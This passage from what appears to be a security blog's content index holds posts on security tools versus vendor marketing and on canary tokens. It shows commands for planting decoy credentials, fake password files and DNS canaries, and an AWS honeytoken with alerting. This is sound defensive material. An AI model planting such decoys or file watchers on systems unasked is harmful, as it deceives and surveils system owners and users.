already on the target. Bash is always there. No explanations needed when someone spots it running.\"\n\u003c/aside\u003e\n\u003cp\u003eThis is a practical guide to using Bash for security operations. Not theory. Not vendor pitches. Techniques that work when you\u0026rsquo;re on a system and need to get things done.\u003c/p\u003e","tags":["bash","security","red-team","blue-team","linux","operations"],"title":"Bash: The Swiss Army Knife for Security Professionals"},{"content":" Vendor: Our AI-powered platform detects zero-day threats before they happen using quantum machine learning.\nSysadmin: Can I configure it?\nVendor: No, it\u0026rsquo;s automated intelligence.\nSysadmin: Can I see logs?\nVendor: No, proprietary algorithms.\nSysadmin: What exactly do I get?\nVendor: Peace of mind.\n\"Marketing departments discovered that 'AI-powered security' sells better than 'decent grep with sensible regex'. The rest is history.\" Security vendor marketing has drifted so far from reality that products and datasheets might as well be different languages. Bought a product that promises \u0026ldquo;zero false positive threat hunting\u0026rdquo;? Got a glorified SIEM with slightly better alerting. Purchased \u0026ldquo;autonomous incident response\u0026rdquo;? Got some prewritten playbooks and a lot of configuration work.\nThis isn\u0026rsquo;t about shitting on all vendors. Some make genuinely good products. But the gap between what security teams think they\u0026rsquo;re buying and what they actually deploy is massive. And that\u0026rsquo;s before the sales team starts explaining how the \u0026ldquo;AI\u0026rdquo; part works.\nThe Marketing vs Reality Gap Let\u0026rsquo;s compare common vendor claims to what you actually get.\n\u0026ldquo;AI-Powered Threat Detection\u0026rdquo; Marketing says:\nOur platform uses advanced machine learning to detect unknown threats, zero-day exploits, and sophisticated attackers. No signature updates required. Set and forget.\nReality:\nIt\u0026rsquo;s anomaly detection on log data. Sometimes finds interesting stuff. Mostly finds legitimate admin activity that looks anomalous because your baseline is wrong. Requires constant tuning. Also needs signature updates for known threats because ML isn\u0026rsquo;t magic.\nWhat actually works:\nDecent anomaly detection (when properly tuned) Basic ML on log patterns (surprisingly useful) Still needs signatures for known threats Still needs human review Still produces false positives (just different ones) What vendor doesn\u0026rsquo;t mention:\nML model needs training data from your environment (months of collection) Baseline needs regular updating as your infrastructure changes False positives from legitimate weird-but-safe activity Requires security analysts to review alerts (not autonomous) \u0026ldquo;Autonomous Incident Response\u0026rdquo; Marketing says:\nWhen threats are detected, our platform automatically contains and remediates without human intervention. Security analysts sleep soundly while AI handles incidents.\nReality:\nSome prewritten automation scripts. Maybe kill processes, isolate hosts, disable accounts. Most of the time requires manual approval because automated containment breaks production. Security analysts still wake up at 3am.\nWhat actually works:\nBasic automation (isolate suspicious host, disable compromised account) Prebuilt response playbooks (same as writing your own scripts) Some things can be automated safely (blocking IP, revoking API keys) Most containment requires manual approval (breaking production is worse than breach) What vendor doesn\u0026rsquo;t mention:\nAutomated containment breaks production regularly Requires extensive testing before trusting automation Most incidents require human judgment anyway \u0026ldquo;Autonomous\u0026rdquo; is a generous term for \u0026ldquo;some prewritten scripts\u0026rdquo; \u0026ldquo;Unified Security Platform\u0026rdquo; Marketing says:\nReplace your entire security stack with our single platform. SIEM, EDR, cloud security, identity, compliance - all in one. Unified data, correlated insights, single pane of glass.\nReality:\nIt\u0026rsquo;s a decent SIEM with some integrations. Cloud security is separate module (extra cost). Identity integration requires expensive professional services. Compliance reporting exists but needs configuration. Single pane of glass mostly just filters and dashboards.\nWhat actually works:\nGood SIEM functionality (if you pay enough) Some integrations out of box Correlated logs are genuinely useful One vendor to yell at when things break What vendor doesn\u0026rsquo;t mention:\nEach module costs extra (it\u0026rsquo;s not actually one price) Deep integration with your existing stack requires professional services Replacing everything is years of work Best-of-breed tools usually beat unified mediocre ones What Actually Works (Spoiler: Boring Stuff) After years of deploying, configuring, troubleshooting, and occasionally removing security tools, here\u0026rsquo;s what consistently delivers value.\n1. Proper Monitoring and Alerting Not \u0026ldquo;AI threat detection.\u0026rdquo; Just knowing when something\u0026rsquo;s wrong.\nWhat works:\nMetric thresholds (CPU \u0026gt; 90% for 5 minutes, disk space \u0026lt; 10%) Log parsing (failed login attempts, unusual admin activity) Network flows (unexpected connections, data egress spikes) Regular expression matching on logs (finds known attack patterns) Why it works:\nUnderstandable - you know what triggers alerts Configurable - you can tune it without PhD Debuggable - when it\u0026rsquo;s wrong, you can see why Predictable - behaves consistently The secret: Most vendors charge fortunes for \u0026ldquo;advanced analytics\u0026rdquo; that\u0026rsquo;s mostly decent regex and statistical thresholds. You can build 80% of this yourself with ELK, Prometheus, and some scripting. The remaining 20% might be worth paying for if you have the budget.\nConcrete example (Prometheus): alert when SSH failures spike.\ngroups: - name: security_basics rules: - alert: SSHBruteForce expr: increase(ssh_failed_attempts_total[10m]) \u0026gt; 10 for: 5m labels: severity: warning annotations: summary: \u0026#34;SSH brute force detected on {{ $labels.instance }}\u0026#34; description: \u0026#34;{{ $value }} failed attempts in 10 minutes (user={{ $labels.user }})\u0026#34; If that metric doesn\u0026rsquo;t exist yet, that\u0026rsquo;s the point. You instrument the boring things you can act on.\n2. Canary Tokens We\u0026rsquo;ve covered this before, but it bears repeating: canary tokens work.\nWhat works:\nDNS canaries planted in configs Document-based canaries in sensitive shares Credential honeytokens in code repos File system canaries in unexpected locations Why it works:\nNear-zero false positives (canary should never be accessed) Immediate detection (when attacker touches it, you know) Simple to understand (no ML black box) Cheap or free (canarytokens.org is literally free) Vendor equivalent: \u0026ldquo;Deception technology platforms\u0026rdquo; charging tens of thousands per year for basically what you can do with a free service and some thought.\nConcrete example (DNS canary in a config):\n# /etc/app/config backup_server=a1b2c3d4e5f6.canarytokens.com If anything tries to resolve that hostname, you get an alert. Your job is to put it somewhere an attacker will trip over it while rummaging.\n3. Vulnerability Scanning Not AI-predictive, just scanning. But scanning works.\nWhat works:\nRegular vulnerability scans (daily or weekly) Container image scanning at build time Dependency scanning in CI/CD Regular penetration testing Why it works:\nFinds known vulnerabilities that attackers use Integrates with patch management workflows Provides prioritisation (critical vs medium vs low) Understandable results (CVE with description) What doesn\u0026rsquo;t work:\nRelying solely on vulnerability scanning without patching Scanning once per year (that\u0026rsquo;s compliance theater, not security) Ignoring \u0026ldquo;medium\u0026rdquo; severity vulnerabilities (attackers use them) Concrete example (containers):\ntrivy image your-image:tag grype your-image:tag Run it in CI. Fail the build on what you actually care about. Then fix the base image and rebuild.\n4. Security Baselines Standardized, secure configurations. Boring but effective.\nWhat works:\nCIS Benchmarks for OS and applications Cloud security baselines (AWS Security Hub, Azure Security Center) Infrastructure as Code with security policies Regular configuration audits Why it works:\nReduces attack surface Catches misconfigurations (actual common breach cause) Automatable (no manual work) Measurable (you can track compliance) The vendor trap: \u0026ldquo;Continuous compliance monitoring platforms\u0026rdquo; that charge for scanning your infrastructure against standards you could run yourself with open source tools (OpenSCAP, Scout Suite, etc.).\nConcrete example (Linux baseline):\nlynis audit system It\u0026rsquo;s not perfect. It\u0026rsquo;s still useful. The biggest value is it gives you a list of boring fixes you can apply this week.\n5. Least Privilege Access Simple concept, hard to implement, massive impact.\nWhat works:\nJust-in-time access (grant access only when needed) Role-based access control (minimal permissions per role) MFA everywhere (no exceptions) Regular access reviews (remove people who don\u0026rsquo;t need access anymore) Why it works:\nLimits blast radius of compromised credentials Makes lateral movement harder Doesn\u0026rsquo;t prevent compromise, limits damage Works with any other security tool The problem: It\u0026rsquo;s hard. Users complain. Management pushes back. Breaking things is common during implementation. But once it\u0026rsquo;s in place, it\u0026rsquo;s genuinely effective.\nConcrete example (GitHub Actions permissions):\nIf you don\u0026rsquo;t set permissions, you often get a token with more access than the job needs.\nname: CI on: [push, pull_request] permissions: contents: read jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - run: make test This doesn\u0026rsquo;t solve everything. It stops \u0026ldquo;random workflow can write to the repo\u0026rdquo; as the default.\n6. Incident Response Playbooks Not \u0026ldquo;autonomous AI response.\u0026rdquo; Just documented, tested procedures.\nWhat works:\nClear runbooks for common incident types (compromised account, malware, data breach) Contact information (who to call, when) Escalation paths (when to escalate to management, legal, PR) Regular drills (test the playbooks) Why it works:\nLess panic during actual incidents Consistent response (not dependent on who\u0026rsquo;s on call) Faster containment (you know what to do) Post-incident learning (improve based on what went wrong) Vendor twist: Some vendors sell \u0026ldquo;incident response platforms\u0026rdquo; that are basically document templates with some automation. Write your own playbooks, add some scripts, same result for less money.\nWhat\u0026rsquo;s Usually Not Worth It Single-Vendor Unified Platforms The promise: one platform for everything. The reality: decent at most things, great at nothing.\nProblems:\nEach module costs extra (it\u0026rsquo;s not actually one price) Integration with existing tools is painful Vendor lock-in (switching is years of work) When one part breaks, debugging across modules is nightmare Better approach: Best-of-breed tools that integrate well. SIEM from one vendor, EDR from another, cloud native tools (CloudTrail, VPC Flow Logs, etc.). More complexity, but better functionality.\nOver-Hyped AI Detection The promise: finds unknown threats. The reality: fancy anomaly detection with different false positives.\nProblems:\nRequires months of training data before it works Still produces false positives (just different ones) Insufficient explainability (why did this alert fire?) Expensive (you\u0026rsquo;re paying for ML development costs) Better approach: Start with solid monitoring (metrics, logs, alerts). Add ML-based anomaly detection if you have the budget and expertise to tune it properly. Don\u0026rsquo;t buy \u0026ldquo;AI\u0026rdquo; thinking it replaces security analysts.\nCompliance-Only Tools The promise: checks all compliance boxes. The reality: generates reports, doesn\u0026rsquo;t improve security.\nProblems:\nCompliance ≠ security (you can be compliant and hacked) Focuses on checkboxes, not actual risk reduction Expensive for value delivered Creates false sense of security (\u0026ldquo;we\u0026rsquo;re PCI compliant, we\u0026rsquo;re good\u0026rdquo;) Better approach: Use compliance requirements as minimum baseline. Implement security that actually reduces risk, then document for compliance. Not the other way around.\nA Practical Framework Here\u0026rsquo;s what I\u0026rsquo;d do if starting from scratch (or rebuilding security stack):\nTier 1: Foundation (Do This First) Monitoring and alerting\nMetrics: Prometheus/Grafana Logs: ELK or Loki Basic alerting on thresholds and log patterns Cost: Free or minimal Security baselines\nCIS Benchmarks for OS Cloud security baselines (native tools, not third-party) Infrastructure as Code with security policies Cost: Time, not money Least privilege access\nMFA everywhere RBAC with minimal permissions Regular access reviews Cost: Political capital, not money Vulnerability scanning\nRegular scans (Trivy, Clair) CI/CD integration (scan images before deploy) Dependency scanning (Snyk or similar) Cost: Free or minimal Tier 2: Detection (Do This After Foundation) Canary tokens\nDNS canaries in configs Document canaries in sensitive shares Credential honeytokens in code repos Cost: Free (canarytokens.org) SIEM\nCentralized log aggregation Correlated alerts Basic analytics Cost: Elastic Cloud or similar (reasonable) Endpoint protection\nEDR with detection capabilities Behavioral analysis (if mature enough organization) Cost: Per-endpoint licensing Tier 3: Advanced (Do This If You Have Budget and Expertise) Advanced threat detection\nML-based anomaly detection User and entity behavior analytics (UEBA) Threat intelligence feeds Cost: Expensive Deception platforms\nBeyond canary tokens Honeypots, honey networks Adaptive deception Cost: Expensive Professional services\nSecurity consulting Penetration testing Red teaming Cost: Expensive but valuable The Sales Pitch Reality Check Next time a vendor pitches you, ask these questions:\n\u0026ldquo;How does it work?\u0026rdquo; If answer is \u0026ldquo;proprietary AI/ML,\u0026rdquo; that means \u0026ldquo;we won\u0026rsquo;t tell you.\u0026rdquo; Ask what data it uses, how it makes decisions, what you can configure.\n\u0026ldquo;What\u0026rsquo;s the false positive rate?\u0026rdquo; Vendor will say \u0026ldquo;near-zero.\u0026rdquo; Push for actual numbers from real deployments. If they can\u0026rsquo;t provide, assume high.\n\u0026ldquo;What happens when it\u0026rsquo;s wrong?\u0026rdquo; Can you see why it alerted? Can you tune it? Can you disable specific rules? If answer is \u0026ldquo;trust the AI,\u0026rdquo; walk away.\n\u0026ldquo;What\u0026rsquo;s the rollback plan?\u0026rdquo; If tool breaks production or causes false positives, how fast can you revert? \u0026ldquo;We can turn it off\u0026rdquo; is not a plan. \u0026ldquo;We can disable this module in under 5 minutes\u0026rdquo; is a plan.\n\u0026ldquo;Show me the logs/alerts.\u0026rdquo; Vendor should be able to show you example alerts from similar deployments. If they can\u0026rsquo;t, either they don\u0026rsquo;t have similar deployments or alerts are garbage.\n\u0026ldquo;What\u0026rsquo;s the total cost?\u0026rdquo; Not just licensing. Implementation time, training, ongoing maintenance. Vendor sells you $50k/year license, then $200k in professional services. Make them include total cost in the pitch.\nThe Honest Truth Most security problems aren\u0026rsquo;t solved by buying fancier tools. They\u0026rsquo;re solved by:\nImplementing boring fundamentals (monitoring, baselines, least privilege) Configuring tools properly (not default settings, but tuned for your environment) Actually responding to alerts (not just tuning them down to zero) Regular testing (penetration testing, drills, tabletop exercises) Building security into development (shift left, not bolt on later) AI-powered vendor platforms can help, but they\u0026rsquo;re force multipliers, not substitutes. Multiply your bad security practices, you get sophisticated failures. Multiply good practices, you get better security.\nStart with the boring stuff. Get it right. Then consider the fancy stuff.\nBecause when the breach happens and management asks \u0026ldquo;why did our $200k AI platform miss this?\u0026rdquo;, you want to be able to say \u0026ldquo;because we didn\u0026rsquo;t have monitoring on this system\u0026rdquo; (fixable), not \u0026ldquo;because the AI black box didn\u0026rsquo;t think it was a threat\u0026rdquo; (not fixable).\nLessons from deploying, configuring, removing, and occasionally throwing away security tools across startups, banks, and everything between. Some good tools exist. Most are marketing wrapped around decent open source you could run yourself.\n","date":"12 Nov 2024","permalink":"https://gazsecops.github.io/posts/security-tools-marketing-vs-reality/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e Our AI-powered platform detects zero-day threats before they happen using quantum machine learning.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Can I configure it?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e No, it\u0026rsquo;s automated intelligence.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Can I see logs?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e No, proprietary algorithms.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What exactly do I get?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e Peace of mind.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Marketing departments discovered that 'AI-powered security' sells better than 'decent grep with sensible regex'. The rest is history.\"\n\u003c/aside\u003e\n\u003cp\u003eSecurity vendor marketing has drifted so far from reality that products and datasheets might as well be different languages. Bought a product that promises \u0026ldquo;zero false positive threat hunting\u0026rdquo;? Got a glorified SIEM with slightly better alerting. Purchased \u0026ldquo;autonomous incident response\u0026rdquo;? Got some prewritten playbooks and a lot of configuration work.\u003c/p\u003e\n\u003cp\u003eThis isn\u0026rsquo;t about shitting on all vendors. Some make genuinely good products. But the gap between what security teams think they\u0026rsquo;re buying and what they actually deploy is massive. And that\u0026rsquo;s before the sales team starts explaining how the \u0026ldquo;AI\u0026rdquo; part works.\u003c/p\u003e","tags":["security","vendor-bullshit","operations","detection"],"title":"Security Tools That Actually Work vs What Vendors Sell You"},{"content":" Management: How long did the attacker have access before you detected them?\nSysadmin: About six months.\nManagement: What finally tipped you off?\nSysadmin: Customer complained their data showed up on a forum.\nThis conversation happens more than you\u0026rsquo;d think. Not because organizations lack security tools. Because they lack detection that works when prevention fails.\n\"Prevention gets all the budget. Detection gets what's left. Yet detection is what tells you when prevention failed - which it will.\" Canary tokens are silent tripwires. Fake data that looks valuable. When accessed, you get an alert. No false positives. No tuning. No complex rules. Just a clear signal: someone\u0026rsquo;s where they shouldn\u0026rsquo;t be.\nThe Detection Problem Most organizations discover breaches the same way: someone external tells them.\nCommon discovery methods:\nCustomer reports data breach Law enforcement notification Data appears on breach forums Third-party security researcher Ransomware note appears Rarely:\nInternal security tools detected it Why? Because most security tools focus on prevention, not detection.\nTypical security spending:\n80%: Prevention (firewalls, endpoint protection, access controls) 15%: Compliance (audits, policies, checkboxes) 5%: Detection (if that) When prevention fails (and it will), you need to know immediately. Not six months later.\nWhat Canary Tokens Actually Are Digital tripwires. Fake but convincing data planted in systems. When accessed, immediate alert.\nCharacteristics:\nLooks valuable to attackers No legitimate reason to access it Monitored 24/7 Immediate alerts when touched Nearly zero false positives Examples:\nFake credentials in a config file Convincing-looking document titled \u0026ldquo;Customer_SSN_List.xlsx\u0026rdquo; Unused AWS access key with tempting name Database entry that should never be queried DNS name that should never be resolved The name comes from coal miners using canaries to detect gas leaks. Canary dies, miners evacuate. Canary token triggered, security team responds.\nWhy They Work 1. No False Positives Traditional security tools generate thousands of alerts. Most are noise.\nStandard IDS/IPS:\n10,000+ alerts per day 75% false positives Alert fatigue sets in Real alerts get missed Canary tokens:\nFew alerts (only when triggered) Nearly 100% true positives No legitimate reason to access them Each alert demands attention When a canary token fires, something\u0026rsquo;s wrong. No ambiguity. No analysis paralysis. Investigate immediately.\n2. Reverse the Asymmetry Normal security:\nDefenders must be perfect (protect everything) Attackers need one mistake from defenders With canary tokens:\nAttackers must be perfect (avoid all canaries) Defenders need one mistake from attackers You\u0026rsquo;ve shifted the burden. Attacker has to navigate perfectly. One wrong move, you know they\u0026rsquo;re there.\n3. Early Detection Traditional detection finds attackers after they\u0026rsquo;ve compromised systems, moved laterally, and exfiltrated data.\nCanary tokens detect them during reconnaissance, credential harvesting, or initial access attempts.\nTypical detection timeline:\nDay 1: Initial compromise Day 30: Lateral movement begins Day 90: Data exfiltration starts Day 180: External party discovers breach With canary tokens:\nDay 1: Initial compromise Day 1: Attacker touches canary Day 1: Alert fires Day 1: Investigation begins Types of Canary Tokens DNS-Based Tokens Unique DNS name that should never be resolved. When queried, you get alerted.\nExample:\n# Create DNS canary (canarytokens.org) TOKEN=\u0026#34;a1b2c3d4e5f6.canarytokens.com\u0026#34; # Plant in config file echo \u0026#34;backup_server=$TOKEN\u0026#34; \u0026gt;\u0026gt; /etc/app/config # When attacker reads config and tries to connect # DNS query for $TOKEN triggers alert Why it works: DNS queries happen automatically. Attacker doesn\u0026rsquo;t realise they triggered anything. You get a timestamp and a source IP. Depending on where the lookup happens, that source IP might be the attacker\u0026rsquo;s egress IP - or it might be your DNS resolver. Either way, it\u0026rsquo;s a very loud signal that someone ran code or looked at a config they shouldn\u0026rsquo;t.\nDocument-Based Tokens PDF, Word, or Excel files with embedded trackers. Open the document, trigger the alert.\nExample use case:\nDocument name: \u0026#34;Q4_Executive_Salaries_Confidential.xlsx\u0026#34; Location: Finance share, restricted access Contains: Fake salary data, embedded tracking pixel Alert: Immediate email when document opened When opened:\nIP address captured User agent recorded Timestamp logged You know someone accessed \u0026ldquo;confidential\u0026rdquo; data Credential-Based Tokens Fake usernames, passwords, API keys. Planted in code, configs, or files.\nExample:\n# Planted in old git commit AWS_ACCESS_KEY_ID = \u0026#34;AKIAIOSFODNN7EXAMPLE\u0026#34; AWS_SECRET_ACCESS_KEY = \u0026#34;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\u0026#34; # These keys look real # But they\u0026#39;re monitored # Any use triggers alert Why it works: Attackers hunt for credentials. Find these, try them, get caught.\nURL-Based Tokens Web link that should never be visited. Hidden in documents, wikis, or code comments.\nExample:\n# Hidden in wiki page \u0026lt;!-- Internal docs: https://a1b2c3d4.canarytokens.com/docs --\u0026gt; # Or in code comment # TODO: Update config at https://a1b2c3d4.canarytokens.com/config # Or in error message Error: Contact support at https://a1b2c3d4.canarytokens.com/support Anyone clicking the link triggers alert. You get their IP, browser, referrer.\nFile System Tokens Files that should never be accessed. Monitored with filesystem watchers.\nExample (Linux):\n# Create honeypot file cat \u0026gt; /var/backups/.passwords.txt \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; Production Database: Host: db.company.com User: admin Pass: SuperSecret123! EOF # Monitor with inotify inotifywait -m /var/backups/.passwords.txt -e access | while read event; do echo \u0026#34;ALERT: Canary file accessed!\u0026#34; | mail -s \u0026#34;Canary Alert\u0026#34; security@company.com done Any access triggers immediate alert. Legitimate backups don\u0026rsquo;t touch this file.\nPractical Deployment Where to Place Tokens Strategic placement is critical. Put tokens where attackers will look.\nHigh-value targets:\nFinance file shares (fake budget spreadsheets) HR systems (fake employee records) Source code repos (fake API keys in old commits) Database backups (fake tables with \u0026ldquo;sensitive\u0026rdquo; data) Admin workstations (fake credential files) Naming matters:\nBad: canary.txt, honeypot.doc, fake_credentials.json Good: Q4_Financial_Forecast.xlsx, SSH_Keys_Production.txt, Customer_PII_Backup.csv\nMake it tempting. Make it believable.\nDeployment Example Using canarytokens.org (free service):\nCreate a DNS token in the web UI. It gives you a hostname like a1b2c3d4e5f6.canarytokens.com. Plant it somewhere believable (config files, scripts, wikis). Test it once from a controlled place so you know alerts work. Example planting (config):\nDB_BACKUP_HOST=a1b2c3d4e5f6.canarytokens.com That\u0026rsquo;s it. No infrastructure. No maintenance. Just instant alerts when someone touches it.\nEnterprise Deployment For larger environments, need more control:\nUsing OpenCanary:\n# Install OpenCanary apt-get install python3-opencanary # Configure services to emulate cat \u0026gt; /etc/opencanary/opencanary.conf \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; { \u0026#34;device.node_id\u0026#34;: \u0026#34;prod-backup-server\u0026#34;, \u0026#34;ftp.enabled\u0026#34;: true, \u0026#34;ftp.port\u0026#34;: 21, \u0026#34;http.enabled\u0026#34;: true, \u0026#34;http.port\u0026#34;: 80, \u0026#34;smb.enabled\u0026#34;: true, \u0026#34;smb.port\u0026#34;: 445, \u0026#34;logger\u0026#34;: { \u0026#34;class\u0026#34;: \u0026#34;PyLogger\u0026#34;, \u0026#34;kwargs\u0026#34;: { \u0026#34;handlers\u0026#34;: { \u0026#34;SMTP\u0026#34;: { \u0026#34;class\u0026#34;: \u0026#34;logging.handlers.SMTPHandler\u0026#34;, \u0026#34;mailhost\u0026#34;: [\u0026#34;smtp.company.com\u0026#34;, 25], \u0026#34;fromaddr\u0026#34;: \u0026#34;canary@company.com\u0026#34;, \u0026#34;toaddrs\u0026#34;: [\u0026#34;security@company.com\u0026#34;], \u0026#34;subject\u0026#34;: \u0026#34;Canary Alert: {node_id}\u0026#34; } } } } } EOF # Start OpenCanary systemctl start opencanary Now you have a fake server. Looks like backup system. Any connection triggers alert.\nReal-World Scenarios Scenario 1: Stolen Laptop Employee laptop stolen. Attacker has physical access.\nManagement: What\u0026rsquo;s on that laptop?\nSysadmin: Encrypted. But we have canary tokens in Documents folder.\nManagement: What happens if they decrypt it?\nSysadmin: They see files like \u0026ldquo;VPN_Credentials.txt\u0026rdquo; and \u0026ldquo;SSH_Keys.txt\u0026rdquo;. Both are canaries. The moment they open either file, we get alerts.\nResult: Laptop decrypted three days later. Attacker opened canary file. Alert fired. We saw their IP, blocked it, invalidated real credentials. No breach.\nScenario 2: Insider Threat Finance employee has legitimate access to payment systems. Suspicion of data theft.\nManagement: Can we prove they\u0026rsquo;re stealing data?\nSysadmin: Not yet. But we can plant canaries in the database.\nManagement: Like what?\nSysadmin: Fake customer records with tempting details. They have no legitimate reason to access these specific records.\nDeployed three fake customer records:\n\u0026ldquo;Michael Johnson\u0026rdquo; with credit card ending in 1234 \u0026ldquo;Sarah Williams\u0026rdquo; with routing number \u0026ldquo;David Brown\u0026rdquo; with SSN pattern Two days later: Employee queried all three records. Alert fired. Evidence collected. Investigation concluded.\nScenario 3: Cloud Environment AWS environment. Worried about compromised credentials.\nDeployment:\n# Create honeytoken IAM user aws iam create-user --user-name backup-service-prod # Give minimal permissions (enough to look valid, not enough to do damage) cat \u0026gt; honeytoken-policy.json \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [\u0026#34;sts:GetCallerIdentity\u0026#34;], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } EOF aws iam put-user-policy \\ --user-name backup-service-prod \\ --policy-name HoneytokenMinimal \\ --policy-document file://honeytoken-policy.json # Generate access keys aws iam create-access-key --user-name backup-service-prod # Plant keys in developer machine (visible but not obvious) echo \u0026#34;[profile backup]\u0026#34; \u0026gt;\u0026gt; ~/.aws/credentials echo \u0026#34;aws_access_key_id = AKIAIOSFODNN7EXAMPLE\u0026#34; \u0026gt;\u0026gt; ~/.aws/credentials echo \u0026#34;aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\u0026#34; \u0026gt;\u0026gt; ~/.aws/credentials # Alert on ANY use via CloudTrail + EventBridge # Prereq: CloudTrail enabled (management events). If you don\u0026#39;t have CloudTrail, fix that first. # 1) Create an SNS topic for alerts aws sns create-topic --name SecurityAlerts # 2) Create an EventBridge rule matching the honeytoken Access Key ID cat \u0026gt; honeytoken-event-pattern.json \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; { \u0026#34;detail-type\u0026#34;: [\u0026#34;AWS API Call via CloudTrail\u0026#34;], \u0026#34;detail\u0026#34;: { \u0026#34;userIdentity\u0026#34;: { \u0026#34;accessKeyId\u0026#34;: [\u0026#34;AKIAIOSFODNN7EXAMPLE\u0026#34;] } } } EOF aws events put-rule \\ --name HoneytokenUsed \\ --event-pattern file://honeytoken-event-pattern.json # 3) Route it to SNS (wire up permissions/role as needed for your account) aws events put-targets \\ --rule HoneytokenUsed \\ --targets \u0026#39;Id\u0026#39;=\u0026#39;sns\u0026#39;,\u0026#39;Arn\u0026#39;=\u0026#39;arn:aws:sns:us-east-1:123456789012:SecurityAlerts\u0026#39; Result: Developer machine compromised. Attacker exfiltrated AWS credentials. Used honeytoken keys. Alert fired. We rotated all real credentials. Blocked attacker IP. Investigated compromise vector.\nCommon Mistakes Mistake 1: Obvious Naming Don\u0026rsquo;t name files \u0026ldquo;canary.txt\u0026rdquo; or \u0026ldquo;honeypot.doc\u0026rdquo;.\nBad:\ntest_credentials.txt fake_data.csv honeypot_user Good:\nAWS_Prod_Keys.txt Customer_Payment_Info.csv db-admin (username) Make it tempting. Make it believable.\nMistake 2: Too Many Tokens More isn\u0026rsquo;t always better. Too many canaries creates management burden.\nDon\u0026rsquo;t:\n100 canary documents in every folder Canary files everywhere Dozens of unused accounts Do:\nStrategic placement in high-value locations Quality over quantity Maintain inventory of what\u0026rsquo;s deployed where I\u0026rsquo;ve seen organizations deploy hundreds of canaries, then forget where they are. Alert fires, nobody knows if it\u0026rsquo;s legitimate or test.\nMistake 3: No Response Plan Canary fires. Now what?\nBad response:\nIgnore it (was probably nothing) Investigate next week Check and close ticket Good response:\nImmediate investigation Determine if test or legitimate If legitimate, activate incident response Contain and remediate Document for future Canary alerts should trigger immediate action. If you\u0026rsquo;re ignoring them, remove the canaries.\nMistake 4: Revealing Presence Don\u0026rsquo;t let attackers know they triggered a canary.\nBad:\nReturn \u0026ldquo;Access to honeytoken denied\u0026rdquo; Log obvious monitoring messages Change behavior after trigger Good:\nReturn normal-looking errors Silent monitoring No visible change after trigger Keep investigating in background. Don\u0026rsquo;t spook the attacker. Learn what they\u0026rsquo;re after.\nIntegration with Existing Security Canary tokens complement, not replace, existing security:\nTraditional security:\nFirewalls (prevent unauthorized access) EDR (detect malware on endpoints) SIEM (aggregate and analyze logs) IDS/IPS (detect network attacks) Canary tokens add:\nHigh-fidelity detection of post-breach activity Early warning of credential compromise Insider threat detection No false positives Integration example:\n# When canary fires, enrich with SIEM data def handle_canary_alert(alert): # Basic canary data canary_id = alert[\u0026#39;token_id\u0026#39;] source_ip = alert[\u0026#39;source_ip\u0026#39;] timestamp = alert[\u0026#39;timestamp\u0026#39;] # Query SIEM for related activity siem_events = query_siem( ip=source_ip, timerange=(timestamp - 3600, timestamp + 300) # 1hr before, 5min after ) # Check if IP has other suspicious activity if len(siem_events) \u0026gt; 0: severity = \u0026#34;HIGH\u0026#34; # Multiple indicators else: severity = \u0026#34;MEDIUM\u0026#34; # Only canary fired # Create enriched incident incident = { \u0026#39;canary_id\u0026#39;: canary_id, \u0026#39;source_ip\u0026#39;: source_ip, \u0026#39;timestamp\u0026#39;: timestamp, \u0026#39;severity\u0026#39;: severity, \u0026#39;related_events\u0026#39;: siem_events } # Send to incident response queue create_incident(incident) Canary provides the initial alert. SIEM provides context. Together, you get complete picture.\nMeasuring Effectiveness Track these metrics:\nCoverage:\nPercentage of critical assets with canaries nearby Number of different canary types deployed Distribution across environment (on-prem, cloud, endpoints) Activity:\nCanary alerts per month True positives vs false positives (should be near 100% TP) Time from alert to investigation Time from alert to containment Value:\nIncidents detected by canaries vs other methods Time to detect with canaries vs without Cost per canary vs other detection methods Example dashboard:\nCanary Token Dashboard ====================== Active Tokens: 47 Token Types: DNS (15), Documents (12), Credentials (10), Files (10) Alerts This Month: 3 - True Positives: 3 (100%) - False Positives: 0 (0%) Mean Time to Investigate: 12 minutes Mean Time to Contain: 45 minutes Recent Alerts: - 2025-08-18 14:23: DNS canary (db-backup-host.internal) Status: Contained Cause: Compromised developer credentials - 2025-08-15 09:17: Document canary (Q3_Financial_Report.xlsx) Status: Resolved Cause: Employee accessed wrong file share - 2025-08-12 03:44: AWS credential canary Status: Contained Cause: Stolen AWS keys from developer machine Cost vs Value Costs:\nFree options: Canarytokens.org (actually free) Open source: OpenCanary (free, but requires infrastructure) Commercial: Thinkst Canary (~$1500/year per device) Benefits:\nEarly detection (vs 180+ day average dwell time) Near-zero false positives (vs 75% from traditional tools) Low maintenance (set and forget) High-fidelity alerts (actionable immediately) ROI calculation:\nAverage data breach cost: $4.45M (IBM 2023) Average detection time: 197 days Cost with early detection: Lower\nIf canary tokens detect ONE breach 180 days earlier, they\u0026rsquo;ve paid for themselves many times over.\nAdvanced Techniques These 